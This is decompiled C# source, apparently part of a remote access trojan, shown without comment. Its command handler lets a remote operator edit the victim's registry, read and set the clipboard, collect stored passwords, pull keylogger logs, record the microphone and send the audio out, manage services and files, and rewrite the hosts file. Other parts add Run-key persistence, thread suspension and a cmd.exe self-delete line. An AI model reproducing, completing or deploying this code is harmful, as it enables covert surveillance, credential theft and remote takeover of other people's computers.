					((Control)this).Invoke((Delegate)new Delegate3(method_17));
					((Control)this).Invoke((Delegate)new Delegate4(method_19), new object[2]
					{
						array[1],
						array[2]
					});
					break;
				case "ccl":
					((Control)this).Invoke((Delegate)new Delegate1(method_18));
					break;
				case "openRG":
					vmethod_4().method_9("openRG");
					break;
				case "RG":
				{
					object obj = method_25(array[2]);
					switch (array[1])
					{
					case "~":
					{
						string text7 = "RG" + string_17 + "~" + string_17 + array[2] + string_17;
						string text8 = "";
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetSubKeyNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator.MoveNext())
							{
								string text9 = Conversions.ToString(enumerator.Current);
								if (!text9.Contains("\\"))
								{
									text8 = text8 + text9 + string_17;
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						IEnumerator enumerator2 = default(IEnumerator);
						try
						{
							enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator2.MoveNext())
							{
								string text10 = Conversions.ToString(enumerator2.Current);
								string[] array11 = new string[7] { text8, text10, "/", null, null, null, null };
								string[] array12 = array11;
								object[] array4 = new object[1] { text10 };
								object[] array13 = array4;
								bool[] array10 = new bool[1] { true };
								object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValueKind", array13, (string[])null, (Type[])null, array10);
								if (array10[0])
								{
									text10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
								}
								array12[3] = obj2.ToString();
								array11[4] = "/";
								string[] array14 = array11;
								object[] array15 = new object[2] { text10, "" };
								object[] array16 = array15;
								bool[] array17 = new bool[2] { true, false };
								object obj3 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array16, (string[])null, (Type[])null, array17);
								if (array17[0])
								{
									text10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
								}
								array14[5] = obj3.ToString();
								array11[6] = string_17;
								text8 = string.Concat(array11);
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						vmethod_4().method_9(text7 + text8);
						break;
					}
					case "!":
					{
						object[] array4 = new object[3];
						object[] array21 = array4;
						string[] array11 = array;
						string[] array22 = array11;
						int num2 = 3;
						array21[0] = array22[3];
						object[] array23 = array4;
						string[] array24 = array;
						string[] array25 = array24;
						int num3 = 4;
						array23[1] = array25[4];
						object[] array26 = array4;
						string[] array6 = array;
						string[] array27 = array6;
						int num = 5;
						array26[2] = array27[5];
						object[] array8 = array4;
						object[] array28 = array8;
						bool[] array10 = new bool[3] { true, true, true };
						NewLateBinding.LateCall(obj, (Type)null, "SetValue", array28, (string[])null, (Type[])null, array10, true);
						if (array10[0])
						{
							array11[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						if (array10[1])
						{
							array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[1]), typeof(string));
						}
						if (array10[2])
						{
							array6[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[2]), typeof(string));
						}
						break;
					}
					case "@5":
					{
						object[] array4 = new object[2];
						object[] array29 = array4;
						string[] array6 = array;
						string[] array30 = array6;
						int num = 3;
						array29[0] = array30[3];
						array4[1] = false;
						object[] array8 = array4;
						object[] array31 = array8;
						bool[] array10 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array31, (string[])null, (Type[])null, array10, true);
						if (array10[0])
						{
							array6[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						break;
					}
					case "#":
					{
						object[] array4 = new object[1];
						object[] array18 = array4;
						string[] array6 = array;
						string[] array19 = array6;
						int num = 3;
						array18[0] = array19[3];
						object[] array8 = array4;
						object[] array20 = array8;
						bool[] array10 = new bool[1] { true };
						NewLateBinding.LateCall(obj, (Type)null, "CreateSubKey", array20, (string[])null, (Type[])null, array10, true);
						if (array10[0])
						{
							array6[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						break;
					}
					case "$":
					{
						object[] array4 = new object[1];
						object[] array5 = array4;
						string[] array6 = array;
						string[] array7 = array6;
						int num = 3;
						array5[0] = array7[3];
						object[] array8 = array4;
						object[] array9 = array8;
						bool[] array10 = new bool[1] { true };
						NewLateBinding.LateCall(obj, (Type)null, "DeleteSubKeyTree", array9, (string[])null, (Type[])null, array10, true);
						if (array10[0])
						{
							array6[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						break;
					}
					}
					break;
				}
				case "clipss":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("clipss" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "getcli":
					((Control)this).Invoke((Delegate)(Delegate2)delegate
					{
						method_20();
					});
					break;
				case "setc":
					((Control)this).Invoke((Delegate)(Delegate5)delegate(string string_24)
					{
						method_21(string_24);
					}, new object[1] { array[1] });
					break;
				case "clearc":
					((Control)this).Invoke((Delegate)(Delegate0)delegate
					{
						method_22();
					});
					break;
				case "openpw":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("openpw" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "getpw":
					vmethod_4().method_9("getpw" + string_17 + method_26());
					break;
				case "OpenPro1":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("OpenPro1" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "GetService":
				{
					string text4 = "";
					string text5 = "ServiceSplit";
					ServiceController[] services = ServiceController.GetServices();
					ServiceController[] array2 = services;
					foreach (ServiceController val in array2)
					{
						text4 = text4 + val.get_DisplayName() + text5 + val.get_ServiceName() + text5 + ((Enum)val.get_Status()).ToString() + text5 + ((Enum)val.get_ServiceType()).ToString() + text5;
					}
					vmethod_4().method_9("ServiceManager" + string_17 + text4);
					break;
				}
				case "Stop":
					method_24(array[1]);
					break;
				case "Start":
					method_23(array[1]);
					break;
				case "edittextfile":
				{
					StreamReader streamReader = new StreamReader(array[1]);
					string text3 = streamReader.ReadToEnd();
					streamReader.Close();
					vmethod_4().method_9("edittextfile" + string_17 + array[1] + string_17 + text3);
					break;
				}
				case "savetextfile":
				{
					StreamWriter streamWriter = new StreamWriter(array[1]);
					streamWriter.WriteLine(array[2]);
					streamWriter.Close();
					break;
				}
				case "openkl":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("openkl" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "Getloges":
					try
					{
						NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)string.Concat(string.Concat("loges" + string_17, class2_0.string_0), string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
						break;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						break;
					}
				case "openurl":
					Process.Start(array[1]);
					break;
				case "oaudio":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("oaudio" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "raudio":
				{
					string lpReturnString = "open new Type waveaudio Alias recsound";
					string lpCommandString = null;
					mciSendStringA(ref lpReturnString, ref lpCommandString, 0L, 0L);
					lpCommandString = "record recsound";
					lpReturnString = null;
					mciSendStringA(ref lpCommandString, ref lpReturnString, 0L, 0L);
					break;
				}
				case "saudio":
				{
					string lpCommandString = "save recsound " + string_16 + "\\record.wav";
					string lpReturnString = null;
					mciSendStringA(ref lpCommandString, ref lpReturnString, 0L, 0L);
					lpCommandString = "close recsound";
					lpReturnString = null;
					mciSendStringA(ref lpCommandString, ref lpReturnString, 0L, 0L);
					vmethod_4().method_9("rraudio" + string_17 + Convert.ToBase64String(File.ReadAllBytes(string_16 + "\\record.wav")));
					File.Delete(string_16 + "\\record.wav");
					break;
				}
				case "edhost":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("edhost" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "setxt":
				{
					string text2 = File.ReadAllText(string_14 + "\\System32\\drivers\\etc\\hosts");
					vmethod_4().method_9("getxt" + string_17 + text2);
					break;
				}
				case "savtxt":
					File.WriteAllText(string_14 + "\\System32\\drivers\\etc\\hosts", array[1]);
					break;
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	public string method_12()
	{
		string text = "";
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "FileSystem", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Drives", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				DriveInfo driveInfo = (DriveInfo)enumerator.Current;
				switch (driveInfo.DriveType)
				{
				case DriveType.Removable:
				{
					string text5 = Conversions.ToString(driveInfo.RootDirectory.get_Exists());
					if (Conversions.ToBoolean(text5))
					{
						text = text + "[Remove]" + driveInfo.Name + driveInfo.VolumeLabel + "|" + Conversions.ToString(driveInfo.TotalSize) + "FileManagerSplitFileManagerSplit";
					}
					break;
				}
				case DriveType.Fixed:
				{
					string text3 = Conversions.ToString(driveInfo.RootDirectory.get_Exists());
					if (Conversions.ToBoolean(text3))
					{
						text = text + "[Drive]" + driveInfo.Name + driveInfo.VolumeLabel + "|" + Conversions.ToString(driveInfo.TotalSize) + "FileManagerSplitFileManagerSplit";
					}
					break;
				}
				case DriveType.Network:
				{
					string text4 = Conversions.ToString(driveInfo.RootDirectory.get_Exists());
					if (Conversions.ToBoolean(text4))
					{
						text = text + "[Net]" + driveInfo.Name + driveInfo.VolumeLabel + "|" + Conversions.ToString(driveInfo.TotalSize) + "FileManagerSplitFileManagerSplit";
					}
					break;
				}
				case DriveType.CDRom:
				{
					string text2 = Conversions.ToString(driveInfo.RootDirectory.get_Exists());
					if (Conversions.ToBoolean(text2))
					{
						text = text + "[CD]" + driveInfo.Name + driveInfo.VolumeLabel + "|" + Conversions.ToString(driveInfo.TotalSize) + "FileManagerSplitFileManagerSplit";
					}
					break;
				}
				}
			}
			return text;
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public string method_13(object object_4)
	{
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected I4, but got Unknown
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(object_4));
		string text = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			text = text + "[Folder]" + directoryInfo2.get_Name() + "-" + Conversions.ToString((int)FileSystem.GetAttr(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(object_4, (object)"\\"), (object)directoryInfo2.get_Name())))) + "FileManagerSplitFileManagerSplit";
		}
		return text;
	}

	public string method_14(object object_4)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(object_4));
		string text = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			text = text + fileInfo.get_Name() + "|" + fileInfo.Length + "|" + Conversions.ToString((int)File.GetAttributes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(object_4, (object)"\\"), (object)fileInfo.get_Name())))) + "FileManagerSplit";
		}
		return text;
	}

	private static void smethod_0(string string_24, string string_25)
	{
		if (!Directory.Exists(string_25))
		{
			Directory.CreateDirectory(string_25);
		}
		string[] files = Directory.GetFiles(string_24);
		foreach (string text in files)
		{
			string destFileName = Path.Combine(string_25, Path.GetFileName(text));
			File.Copy(text, destFileName);
		}
		string[] directories = Directory.GetDirectories(string_24);
		foreach (string text2 in directories)
		{
			string string_26 = Path.Combine(string_25, Path.GetFileName(text2));
			smethod_0(text2, string_26);
		}
	}

	public void method_15(string string_24)
	{
		string[] array = string_24.Split(new char[1] { '|' });
		vmethod_4().method_9("getfile" + string_17 + array[0] + string_17 + Convert.ToBase64String(File.ReadAllBytes(array[1])) + string_17 + array[2]);
	}

	public void method_16(string string_24)
	{
		string[] array = string_24.Split(new char[1] { '|' });
		File.WriteAllBytes(array[2] + array[0], Convert.FromBase64String(array[1]));
		vmethod_4().method_9("dn" + string_17 + array[3]);
	}

	public void method_17()
	{
		((Control)Class7.smethod_2().method_1()).Show();
	}

	public void method_18()
	{
		((Form)Class7.smethod_2().method_1()).Close();
	}

	public void method_19(string string_24, string string_25)
	{
		RichTextBox val = Class7.smethod_2().method_1().vmethod_0();
		val.set_Text(val.get_Text() + Environment.NewLine + "[" + string_25 + "] : " + string_24);
		((TextBoxBase)Class7.smethod_2().method_1().vmethod_0()).set_SelectionStart(Class7.smethod_2().method_1().vmethod_0()
			.get_Text()
			.Length);
			((TextBoxBase)Class7.smethod_2().method_1().vmethod_0()).ScrollToCaret();
			((Form)Class7.smethod_2().method_1()).set_Text("Chating With >> " + string_25);
		}

		public string method_20()
		{
			string text = Clipboard.GetText();
			vmethod_4().method_9("recvcli" + string_17 + text);
			return Conversions.ToString(true);
		}

		public object method_21(string string_24)
		{
			Clipboard.SetText(string_24);
			return true;
		}

		public object method_22()
		{
			Clipboard.Clear();
			return true;
		}

		public void method_23(string string_24)
		{
			ServiceController[] services = ServiceController.GetServices();
			try
			{
				ServiceController[] array = services;
				int num = 0;
				ServiceController val;
				while (true)
				{
					if (num < array.Length)
					{
						val = array[num];
						if (Operators.CompareString(Strings.UCase(val.get_ServiceName()), Strings.UCase(string_24), false) == 0)
						{
							break;
						}
						num = checked(num + 1);
						continue;
					}
					return;
				}
				val.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void method_24(string string_24)
		{
			ServiceController[] services = ServiceController.GetServices();
			try
			{
				ServiceController[] array = services;
				int num = 0;
				ServiceController val;
				while (true)
				{
					if (num < array.Length)
					{
						val = array[num];
						if (Operators.CompareString(Strings.UCase(val.get_ServiceName()), Strings.UCase(string_24), false) == 0)
						{
							break;
						}
						num = checked(num + 1);
						continue;
					}
					return;
				}
				val.Stop();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public RegistryKey method_25(string string_24)
		{
			if (string_24.StartsWith(Registry.ClassesRoot.Name))
			{
				string name = string_24.Replace(Registry.ClassesRoot.Name + "\\", "");
				return Registry.ClassesRoot.OpenSubKey(name, writable: true);
			}
			if (string_24.StartsWith(Registry.CurrentUser.Name))
			{
				string name = string_24.Replace(Registry.CurrentUser.Name + "\\", "");
				return Registry.CurrentUser.OpenSubKey(name, writable: true);
			}
			if (string_24.StartsWith(Registry.LocalMachine.Name))
			{
				string name = string_24.Replace(Registry.LocalMachine.Name + "\\", "");
				return Registry.LocalMachine.OpenSubKey(name, writable: true);
			}
			if (string_24.StartsWith(Registry.Users.Name))
			{
				string name = string_24.Replace(Registry.Users.Name + "\\", "");
				return Registry.Users.OpenSubKey(name, writable: true);
			}
			return null;
		}

		public string method_26()
		{
			Class13.string_0 = "";
			Class13.smethod_1();
			Class13.smethod_3();
			Class15.smethod_0();
			Class13.smethod_0();
			Class11 @class = new Class11();
			@class.method_6();
			return Class13.string_0;
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfoA(int int_3, int int_4, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_24, int int_5);

		[SpecialName]
		public virtual Class0 vmethod_4()
		{
			return class0_0;
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public virtual void vmethod_5(Class0 class0_1)
		{
			Class0.Delegate7 delegate7_ = method_11;
			Class0.Delegate8 delegate8_ = method_10;
			Class0.Delegate6 delegate6_ = method_9;
			if (class0_0 != null)
			{
				class0_0.method_5(delegate7_);
				class0_0.method_3(delegate8_);
				class0_0.method_1(delegate6_);
			}
			class0_0 = class0_1;
			if (class0_0 != null)
			{
				class0_0.method_4(delegate7_);
				class0_0.method_2(delegate8_);
				class0_0.method_0(delegate6_);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_24, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_25);

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString, long uReturnLength, long hwndCallback);

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_3);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_24, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_25, int int_3, ref int int_4, ref int int_5, ref int int_6, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_26, int int_7);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void Sleep(long long_0);

		[DllImport("ntdll")]
		private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_3, ref int int_4, int int_5);

		private void method_27(Process process_0)
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = process_0.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessThread processThread = (ProcessThread)enumerator.Current;
					IntPtr intPtr = Class12.OpenThread(Class12.Enum1.const_1, bool_0: false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						Class12.SuspendThread(intPtr);
						Class12.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public string method_28(ref string string_24)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_24);
			return Convert.ToBase64String(bytes);
		}

		public string method_29(ref string string_24)
		{
			byte[] bytes = Convert.FromBase64String(string_24);
			return Encoding.UTF8.GetString(bytes);
		}

		[MethodImpl(MethodImplOptions.NoOptimization)]
		public void method_30()
		{
			method_4(0);
			class3_0.method_1();
			try
			{
				File.Delete(Path.GetTempPath() + "mlt.tmp");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string name = string_2.Replace(".exe", "");
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
			registryKey.SetValue(name, Application.get_ExecutablePath(), RegistryValueKind.String);
			registryKey.DeleteValue(string_2.Replace(".exe", ""));
			try
			{
				_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_21 + ".exe";
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software", writable: true)!.DeleteSubKey(string_21, throwOnMissingSubKey: false);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" & exit")), (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_31(object sender, SessionEndingEventArgs e)
		{
			method_3();
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_32(object sender, EventArgs e)
		{
			method_6();
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_33(object object_4)
		{
			method_16(Conversions.ToString(object_4));
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_34(object object_4)
		{
			method_15(Conversions.ToString(object_4));
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_35()
		{
			method_20();
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_36(string string_24)
		{
			method_21(string_24);
		}

		[SpecialName]
		[CompilerGenerated]
		private void method_37()
		{
			method_22();
		}
	}
